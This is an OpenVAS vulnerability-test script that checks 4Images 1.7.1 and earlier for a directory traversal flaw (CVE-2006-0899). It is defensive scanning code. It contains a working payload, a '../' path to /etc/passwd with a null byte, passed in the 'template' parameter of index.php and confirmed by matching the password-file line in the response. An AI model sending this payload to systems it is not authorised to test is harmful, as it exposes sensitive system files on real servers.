# OpenVAS Vulnerability Test
# $Id: 4images_171_directory_traversal.nasl 17 2013-10-27 14:01:43Z jan $
# Description: 4Images <= 1.7.1 Directory Traversal Vulnerability
#
# Authors:
# Ferdy Riphagen <f[dot]riphagen[at]nsec[dot]nl>
#
# Copyright:
# Copyright (C) 2006 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote web server contains a PHP application that is prone to
directory traversal attacks. 

Description :

4Images is installed on the remote system.  It is an image gallery
management system. 

The installed application does not validate user-input passed in the
'template' variable of the 'index.php' file.  This allows an attacker
to execute directory traversal attacks and display the content of
sensitive files on the system and possibly to execute arbitrary PHP
code if he can write to local files through some other means.";

tag_solution = "Sanitize the 'index.php' file.";

# Original advisory / discovered by : 
# http://retrogod.altervista.org/4images_171_incl_xpl.html

if (description) {
 script_id(21020);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");

 script_cve_id("CVE-2006-0899");
 script_bugtraq_id(16855);

 name = "4Images <= 1.7.1 Directory Traversal Vulnerability";
 script_name(name);
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_description(desc);
 summary = "Check if 4Images is vulnerable to directory traversal flaws";
 script_summary(summary);

 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2006 Ferdy Riphagen");

 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://www.4homepages.de/forum/index.php?topic=11855.0");
 script_xref(name : "URL" , value : "http://secunia.com/advisories/19026/");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

if (thorough_tests) dirs = make_list("/4images", "/gallery", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
 res = http_get_cache(item:string(dir, "/index.php"), port:port); 
 if(res == NULL) exit(0);

 if (egrep(pattern:"Powered by.+4images", string:res)) {
 
  file = "../../../../../../../../etc/passwd";
  req = http_get(item:string(dir, "/index.php?template=", file, "%00"), port:port);

  recv = http_keepalive_send_recv(data:req, port:port, bodyonly:TRUE);
  if (recv == NULL) exit(0);

  if (egrep(pattern:"root:.*:0:[01]:.*:", string:recv)) {
   security_hole(port);
   exit(0); 
  } 
 }
}
